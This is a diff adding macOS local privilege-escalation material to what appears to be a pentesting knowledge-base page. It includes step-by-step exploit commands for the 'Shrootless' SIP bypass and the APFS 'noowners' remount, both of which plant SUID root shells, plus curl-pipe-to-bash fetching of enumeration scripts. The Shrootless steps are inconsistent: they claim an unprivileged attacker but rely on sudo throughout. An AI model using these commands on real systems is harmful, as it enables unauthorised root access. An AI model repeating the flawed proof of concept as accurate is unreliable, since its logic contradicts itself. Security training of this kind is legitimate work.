@@ -236,6 +236,70 @@ ls /tmp/snap/Users/admin_user # This will work
 
 A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
+## Recent Local Privilege Escalation & SIP Bypass (2021-2024)
+
+### CVE-2021-30892 – “Shrootless” System Integrity Protection bypass
+
+Apple-signed installer packages executed by `system_installd` run their *post-install* scripts as **root** with the `com.apple.rootless.install.inheritable` entitlement. The daemon evaluates **`/etc/zshenv`** before running any shell script, even while SIP is enabled. By planting a malicious `/etc/zshenv`, an unprivileged user can execute code with **SIP disabled**, gaining full access to protected filesystem paths and the ability to load unsigned kernel extensions.
+
+```bash
+# 1. Drop a malicious zshenv that will be sourced by system_installd
+echo 'cp /bin/zsh /tmp/shrootless && chmod +s /tmp/shrootless' | sudo tee /etc/zshenv
+
+# 2. Trigger an Apple-signed package installation
+sudo installer -pkg /System/Library/Updates/bridgeOSUpdateCustomer.pkg -target /
+
+# 3. Enjoy your SUID root shell (SIP already bypassed)
+/tmp/shrootless -p
+```
+
+Patched in macOS Monterey 12.0.1 / Big Sur 11.6.1 (26 Oct 2021).
+
+
+---
+
+### CVE-2023-42931 – `diskutil mount … -mountOptions noowners` APFS privilege escalation
+
+Any local user (even *guest*) could remount a writable APFS volume with the **`noowners`** option, making every file appear owned by the current user. The attacker can then replace an unprotected root-owned file (e.g. the placeholder `/.file`) with a SUID shell, unmount and remount the volume with normal ownership, and execute the file to obtain **root**.
+
+```bash
+# Identify the data volume (example: disk3s4)
+diskutil list | grep 'Data Volume'
+
+# 1. Mount it without owners
+diskutil mount disk3s4 -mountOptions noowners
+
+# 2. Plant a SUID shell
+cp /bin/zsh /.file && chmod +s /.file
+
+# 3. Restore normal mount
+diskutil unmount disk3s4
+diskutil mount disk3s4
+
+# 4. Profit – root shell
+/.file -p
+```
+
+Fixed in Sonoma 14.2, Ventura 13.6.3 and Monterey 12.7.2 (Dec 2023).
+
+
+---
+
+## Enumeration helpers
+
+Running an automated enumerator quickly highlights low-hanging fruit:
+
+* **MacPEAS** – Bash enumeration script for macOS privilege-escalation checks.
+  ```bash
+  curl -sSL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/mac/macpeas.sh | bash
+  ```
+* **SwiftBelt** – Swift-based tool inspired by Seatbelt that enumerates persistence & LPE vectors.
+  ```bash
+  git clone https://github.com/cedowens/SwiftBelt && cd SwiftBelt && swift run
+  ```
+
+
+
 ## Sensitive Information
 
 This can be useful to escalate privileges:
@@ -243,6 +307,11 @@ This can be useful to escalate privileges:
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## References
+
+- [Microsoft Security Blog – “Shrootless” SIP bypass (CVE-2021-30892)](https://www.microsoft.com/security/blog/2021/10/26/shrootless-new-macos-vulnerability-that-could-bypass-system-integrity-protection/)
+- [Alter Solutions – Local privilege escalation via APFS “noowners” remount (CVE-2023-42931)](https://www.alter-solutions.com/articles/local-privilege-escalating-apple-macos-filesystems)
 
 {{#include ../../banners/hacktricks-training.md}}
 
